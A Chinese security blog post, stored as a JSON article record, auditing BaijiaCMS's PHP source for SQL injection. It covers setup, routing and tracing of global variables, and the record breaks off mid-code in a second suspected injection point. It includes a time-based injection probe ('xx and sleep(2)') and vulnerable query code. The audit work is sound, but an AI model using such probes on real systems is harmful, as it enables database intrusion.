{"title":"PHP代码审计之旅之百家CMS","uid":"2701665bc33e3ae6e528c88e69e6e2f6","slug":"代码审计之旅之百家CMS","date":"2022-11-02T17:41:30.000Z","updated":"2024-02-14T07:30:42.000Z","comments":true,"path":"api/articles/代码审计之旅之百家CMS.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141536144.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>之前审计的CMS大多是利用工具，即<code>Seay+昆仑镜</code>联动扫描出漏洞点，而后进行审计。感觉自己的能力仍与零无异，因此本次审计CMS绝大多数使用手动探测，即通过搜索危险函数的方式进行漏洞寻找，以此来提升审计能力，希望对正在学习代码审计的师傅能有所帮助。</p>\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>源码链接如下所示<br><a href=\"https://gitee.com/openbaijia/baijiacms\">https://gitee.com/openbaijia/baijiacms</a><br>安装至本地后，我这里是<code>phpstudy+win10</code>，所以直接解压到<code>phpstudy</code>的<code>www</code>目录下即可<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533519.png\" alt=\"在这里插入图片描述\"><br>接下来去创建一个数据库用于存储CMS信息。（在Mysql命令行中执行）<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533507.png\" alt=\"在这里插入图片描述\"><br>接下来访问CMS，会默认跳转至安装界面<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533526.png\" alt=\"在这里插入图片描述\"><br>数据库名称和账密注意一下就好，其他随便写<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533501.png\" alt=\"在这里插入图片描述\"><br>而后安装成功，可以开始进行审计了。</p>\n<h1 id=\"审计\"><a href=\"#审计\" class=\"headerlink\" title=\"审计\"></a>审计</h1><h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><p>我们拿到一套源码时，首先需要对具体文件夹进行一次分析，这样才能对CMS有一个初步的印象，为后续审计做一些铺垫。<br>根目录如下所示<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533512.png\" alt=\"在这里插入图片描述\"><br>其对应目录解释如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">addons     插件\napi        接口\nassets     静态文件\nattachment 上传目录\ncache      缓存目录\nconfig     系统文件\n<span class=\"token keyword\">include</span>    系统文件\nsystem     后端代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>针对<code>system</code>目录，这个较为常用，我们可以对其进行进一步分析</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">system 系统模块目录\n ├─alipay 支付宝服务窗模块\n ├─bonus 优惠券模块\n ├─common 公共函数模板\n ├─index 登录页\n ├─member 会员模块\n ├─modules 可再扩展模块和模块管理\n ├─<span class=\"token keyword\">public</span> 公共模块\n ├─shop 后台商城模块\n ├─shopwap 前台商城模块\n ├─user 系统用户\n └─weixin 微信模块<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>对这些有过了解后，还需要看的就是一些后端支撑文件，例如这种<code>xxxinc.php</code>文件，他们常常存在一些漏洞，进而导致CMS出现漏洞<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533524.png\" alt=\"在这里插入图片描述\"><br>所以简单阅读一下这些也是有必要的。接下来准备工作做完，就开始下一步。</p>\n<h2 id=\"路由解析\"><a href=\"#路由解析\" class=\"headerlink\" title=\"路由解析\"></a>路由解析</h2><p>对一个CMS进行漏洞探测前，我们需要首先需要对CMS的路由有所了解。<br>这里我们直接访问默认页面<code>baijiacms-master/index.php</code>，然后登录后台，这里说一下我自己认为找路由还可以的方法，就是关注一些特别点，好找一些，比如这里的修改密码界面<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533968.png\" alt=\"在这里插入图片描述\"></p>\n<p>我们点击它，发现此时的路由如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">baijiacms<span class=\"token operator\">-</span>master<span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>mod<span class=\"token operator\">=</span>site<span class=\"token operator\">&amp;</span>act<span class=\"token operator\">=</span>manager<span class=\"token operator\">&amp;</span><span class=\"token keyword\">do</span><span class=\"token operator\">=</span>changepwd<span class=\"token operator\">&amp;</span>beid<span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>接下来我们在Vscode中进行全局搜索，搜<code>password=</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533169.png\" alt=\"在这里插入图片描述\"><br>结果如下，可以发现它的路径</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">baijiacms<span class=\"token operator\">-</span>master\\system\\manager\\<span class=\"token keyword\">class</span>\\web\\changepwd<span class=\"token operator\">.</span>php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>再找到它的具体位置<br><img src=\"https://img-blog.csdnimg.cn/ca8485366301453a91858201bc2c426a.png\" alt=\"在这里插入图片描述\"><br>我们将它与之前看到的路由进行比对，就可以发现<code>act</code>其实是<code>system</code>文件夹下的文件夹名称，<code>do</code>是所选择具体文件的名称,对这些有个初步的了解，待会找到文件时能在网页中访问即可。</p>\n<h2 id=\"漏洞查找\"><a href=\"#漏洞查找\" class=\"headerlink\" title=\"漏洞查找\"></a>漏洞查找</h2><p>这里<code>Seay+关键词搜索</code>的方式进行漏洞查找</p>\n<h3 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h3><h4 id=\"疑点一（失败）\"><a href=\"#疑点一（失败）\" class=\"headerlink\" title=\"疑点一（失败）\"></a>疑点一（失败）</h4><p>发现有很多疑似注入点，从第一个开始跟进看<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533161.png\" alt=\"在这里插入图片描述\"><br>文件路由<code>/addons/activity/class/mobile/index.php</code><br>重点代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">global</span> <span class=\"token variable\">$_W</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GPC</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$activityid</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GPC</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'activityid'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$operation</span> <span class=\"token operator\">=</span> <span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GPC</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'op'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_GPC</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'op'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'display'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pagetitle</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"活动报名入口\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$activity</span> <span class=\"token operator\">=</span> <span class=\"token function\">pdo_fetch</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SELECT * FROM \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">table</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'activity'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" WHERE uniacid = '<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_W</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uniacid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span>' and id = \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$activityid</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看到<code>uniacid</code>变量确实未被单引号包裹，可能存在注入，但我们这里注意到它是<code>$_W[&#39;uniacid&#39;]</code>，追溯<code>$_W</code>，看到<code>global $_W,$_GPC;</code>，这个是全局变量，所以我们直接在vscode中进行查找（ctrl+shift+f全局搜索）<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533270.png\" alt=\"在这里插入图片描述\"><br>发现<code>$_GPC=$_GP</code>，所以我们只需要确定<code>$_GP</code>，就可以确定<code>$_GPC</code>，接下来寻找<code>$_GP</code>，最终在<code>baijiacms.php</code>中发现此变量<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533869.png\" alt=\"在这里插入图片描述\"></p>\n<p>这里的话可以看出是对所有方法请求的参数进行了一个<code>stripslashes</code>函数处理，而后将参数进行了合并，合并后对数组内的参数依次进行遍历，进行<code>htmlspecialchars</code>函数处理，而后将实体字符<code>&amp;amp</code>替换为<code>&amp;</code>。不过这个是<code>$_GPC</code>的，但都是全局变量，<code>$_W</code>应该也类似，接下来再跟着看一下，我们全局搜索<code>$_W=</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533721.png\" alt=\"在这里插入图片描述\"><br>这里可以发现<code>$W=$_CMS</code>，同时看出我们的<code>$_W[&#39;uniacid&#39;]=$_CMS[&#39;beid&#39;]</code>，接下来搜索<code>$_CMS[&#39;beid&#39;]=</code><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533833.png\" alt=\"在这里插入图片描述\"><br>找到它等同于一个函数，即<code>getDomainBeid</code>函数，所以接下来寻找<code>getDomainBeid</code>函数<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533028.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getDomainBeid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">global</span> <span class=\"token variable\">$_GP</span><span class=\"token punctuation\">;</span>\n\n\t\t\t<span class=\"token variable\">$system_store</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqld_select</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'SELECT id,isclose FROM '</span><span class=\"token operator\">.</span><span class=\"token function\">table</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'system_store'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" where (`website`=:website1 or `website`=:website2) and `deleted`=0 \"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":website1\"</span><span class=\"token operator\">=></span><span class=\"token constant\">WEB_WEBSITE</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\":website2\"</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'www.'</span><span class=\"token operator\">.</span><span class=\"token constant\">WEB_WEBSITE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\n\t\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$system_store</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GP</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'beid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token variable\">$system_store</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqld_select</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'SELECT id,isclose FROM '</span><span class=\"token operator\">.</span><span class=\"token function\">table</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'system_store'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" where `id`=:id  and `deleted`=0\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":id\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$_GP</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'beid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$system_store</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token function\">message</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"未找到相关店铺\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$system_store</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'isclose'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token function\">message</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"店铺已关闭无法访问\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$system_store</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\t\n\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span>\n\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\t\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$system_store</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'isclose'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token function\">message</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"店铺已关闭无法访问\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\n\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$system_store</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里可以看出<code>system_store</code>是由系统数据库中查出来的数据，这个对我们来说是不可控的，我们可控的是<code>$_GP[&#39;beid&#39;]</code>,此时看着一个SQL语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$system_store</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqld_select</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'SELECT id,isclose FROM '</span><span class=\"token operator\">.</span><span class=\"token function\">table</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'system_store'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" where `id`=:id  and `deleted`=0\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":id\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$_GP</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'beid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>如果我们的数据正常，他的结果应该是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id  isclose\nxx  xxxxxxx\nxx  xxxxxxx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>而当我们输入<code>beid</code>为<code>xx and sleep(2)</code>这种，它毫无疑问是不会有查询结果的，这也就意味着<code>$system_store[&#39;id&#39;]</code>，而这个函数的最终结果是<code>return $system_store[&#39;id&#39;];    </code>，那么此时它就会返回空值，那么回到这个SQL语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">pdo_fetchall</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select * from \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">tablename</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'eshop_member'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" where isagent =1 and status=1 and uniacid = \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_W</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uniacid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$condition</span><span class=\"token punctuation\">&#125;</span></span>  ORDER BY agenttime desc limit \"</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$pindex</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$psize</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">','</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$psize</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>中，如果我们那里正常，想让返回的不为空值，那么这个<code>$_W[&#39;uniacid&#39;]</code>只能接收到正常的id，也就是数据库中存储着的<code>id</code>值，所以这里是无法进行SQL注入的。</p>\n<p>类似这个的还有如下文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">文件名：system<span class=\"token operator\">/</span>eshop<span class=\"token operator\">/</span>core<span class=\"token operator\">/</span>mobile<span class=\"token operator\">/</span>commission<span class=\"token operator\">/</span>team<span class=\"token operator\">.</span>php\n部分<span class=\"token constant\">PHP</span>代码\n<span class=\"token variable\">$list</span> <span class=\"token operator\">=</span> <span class=\"token function\">pdo_fetchall</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select * from \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">tablename</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'eshop_member'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" where isagent =1 and status=1 and uniacid = \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_W</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uniacid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$condition</span><span class=\"token punctuation\">&#125;</span></span>  ORDER BY agenttime desc limit \"</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$pindex</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$psize</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">','</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$psize</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n文件名<span class=\"token punctuation\">:</span> <span class=\"token operator\">/</span>addons<span class=\"token operator\">/</span>activity<span class=\"token operator\">/</span><span class=\"token keyword\">class</span><span class=\"token operator\">/</span>web<span class=\"token operator\">/</span>activity<span class=\"token operator\">.</span>php\n部分<span class=\"token constant\">PHP</span>代码：\n<span class=\"token variable\">$activity</span> <span class=\"token operator\">=</span> <span class=\"token function\">pdo_fetch</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SELECT * FROM \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">table</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'activity'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" WHERE uniacid = '<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_W</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uniacid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span>' and id = \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$activityid</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n文件名：<span class=\"token operator\">/</span>addons<span class=\"token operator\">/</span>activity<span class=\"token operator\">/</span><span class=\"token keyword\">class</span><span class=\"token operator\">/</span>mobile<span class=\"token operator\">/</span>join<span class=\"token operator\">.</span>php\n部分<span class=\"token constant\">PHP</span>代码：\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">pdo_fetch</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SELECT id FROM \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">table</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'activity'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" WHERE uniacid = '<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_W</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uniacid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span>' and id = \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$activityid</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n文件名：<span class=\"token operator\">/</span>addons<span class=\"token operator\">/</span>activity<span class=\"token operator\">/</span><span class=\"token keyword\">class</span><span class=\"token operator\">/</span>web<span class=\"token operator\">/</span>records<span class=\"token operator\">.</span>php\n部分<span class=\"token constant\">PHP</span>代码：\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">pdo_fetch</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SELECT id,pic FROM \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">table</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'activity_records'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" WHERE id = <span class=\"token interpolation\"><span class=\"token variable\">$id</span></span> and uniacid = '<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_W</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uniacid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span>'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n文件名：<span class=\"token operator\">/</span>system<span class=\"token operator\">/</span>eshop<span class=\"token operator\">/</span>core<span class=\"token operator\">/</span>web<span class=\"token operator\">/</span>shop<span class=\"token operator\">/</span>dispatch<span class=\"token operator\">.</span>php\n部分<span class=\"token constant\">PHP</span>代码：\n<span class=\"token variable\">$dispatch</span> <span class=\"token operator\">=</span> <span class=\"token function\">pdo_fetch</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SELECT id,dispatchname FROM \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">tablename</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'eshop_dispatch'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" WHERE id = '<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>' AND uniacid=\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_W</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uniacid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n文件名： <span class=\"token operator\">/</span>system<span class=\"token operator\">/</span>eshop<span class=\"token operator\">/</span>core<span class=\"token operator\">/</span>web<span class=\"token operator\">/</span>virtual<span class=\"token operator\">/</span>category<span class=\"token operator\">.</span>php\n部分<span class=\"token constant\">PHP</span>代码<span class=\"token punctuation\">:</span>\n<span class=\"token variable\">$list</span> <span class=\"token operator\">=</span> <span class=\"token function\">pdo_fetchall</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SELECT * FROM \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">tablename</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'eshop_virtual_category'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" WHERE uniacid = '<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_W</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uniacid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span>' ORDER BY id DESC\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"疑点二（失败）\"><a href=\"#疑点二（失败）\" class=\"headerlink\" title=\"疑点二（失败）\"></a>疑点二（失败）</h4><p>文件路径<code>/system/common/model/virtual.php</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533146.png\" alt=\"在这里插入图片描述\"><br>这里发现参数<code>id</code>，跟进<code>id</code>变量，发现来源于</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">updateGoodsStock</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$_W</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GPC</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$goods</span> <span class=\"token operator\">=</span> <span class=\"token function\">pdo_fetch</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select virtual from '</span> <span class=\"token operator\">.</span> <span class=\"token function\">tablename</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'eshop_goods'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string 